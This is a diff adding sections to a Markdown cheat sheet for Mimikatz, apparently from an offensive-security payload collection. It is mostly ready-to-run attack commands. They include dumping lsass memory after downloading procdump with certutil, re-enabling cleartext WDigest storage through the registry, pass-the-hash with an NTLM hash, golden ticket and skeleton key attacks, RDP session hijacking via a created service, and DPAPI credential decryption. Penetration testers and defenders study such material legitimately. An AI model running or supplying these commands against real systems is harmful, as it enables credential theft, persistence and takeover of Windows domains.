@@ -1,5 +1,19 @@
 # Windows - Mimikatz
 
+## Summary
+
+* [Mimikatz - Execute commands](#mimikatz---execute-commands)
+* [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
+* [Mimikatz - Mini Dump](#mimikatz---mini-dump)
+* [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
+* [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
+* [Mimikatz - Skeleton key](#mimikatz---skeleton-key)
+* [Mimikatz - RDP session takeover](#mimikatz---rdp-session-takeover)
+* [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
+* [Mimikatz - Commands list](#mimikatz---commands-list)
+* [Mimikatz - Powershell version](#mimikatz---powershell-version)
+* [References](#references)
+
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
 
 ## Mimikatz - Execute commands
@@ -21,6 +35,8 @@ mimikatz # sekurlsa::wdigest
 
 ## Mimikatz - Extract passwords
 
+> Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.
+
 ```powershell
 mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
@@ -28,15 +44,31 @@ mimikatz_command -f sekurlsa::wdigest
 # to re-enable wdigest in Windows Server 2012+
 # in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
 # create a DWORD 'UseLogonCredential' with the value 1.
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
 ```
+
+:warning: To take effect, conditions are required :
+- Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
+  * Adding requires lock
+  * Removing requires signout
+- Win10:
+  * Adding requires signout
+  * Removing requires signout
+- Win2016:
+  * Adding requires lock
+  * Removing requires reboot
+
 
 ## Mimikatz - Mini Dump
 
 Dump the lsass process.
 
 ```powershell
-C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# HTTP method
+certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
+C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
+# SMB method
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
@@ -49,7 +81,13 @@ Switch to minidump
 mimikatz # sekurlsa::logonPasswords
 ```
 
-## Mimikatz Golden ticket
+## Mimikatz - Pass The Hash
+
+```powershell
+mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
+```
+
+## Mimikatz - Golden ticket
 
 ```powershell
 .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
@@ -59,7 +97,7 @@ mimikatz # sekurlsa::logonPasswords
 .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
-## Mimikatz Skeleton key
+## Mimikatz - Skeleton key
 
 ```powershell
 privilege::debug
@@ -70,7 +108,60 @@ net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
-## Mimikatz commands
+## Mimikatz - RDP session takeover
+
+Use `ts::multirdp` to patch the RDP service to allow more than two users.
+
+Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
+
+```powershell
+privilege::debug 
+token::elevate 
+ts::remote /id:2 
+```
+
+```powershell
+# get the Session ID you want to hijack
+query user
+create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+net start sesshijack
+```
+
+
+
+
+## Mimikatz - Credential Manager & DPAPI
+
+```powershell
+# check the folder to find credentials
+dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
+
+# check the file with mimikatz
+$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+# find master key
+$ mimikatz !sekurlsa::dpapi
+
+# use master key
+$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+```
+
+Task Scheduled credentials
+
+```powershell
+mimikatz(commandline) # vault::cred /patch
+TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
+UserName   : DOMAIN\user
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Attributes : 0
+```
+
+
+## Mimikatz - Commands list
 
 | Command |Definition|
 |:----------------:|:---------------|
@@ -97,7 +188,7 @@ rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 |TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
 |TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.
 
-## Powershell Mimikatz
+## Mimikatz - Powershell version
 
 Mimikatz in memory (no binary on disk) with :
 
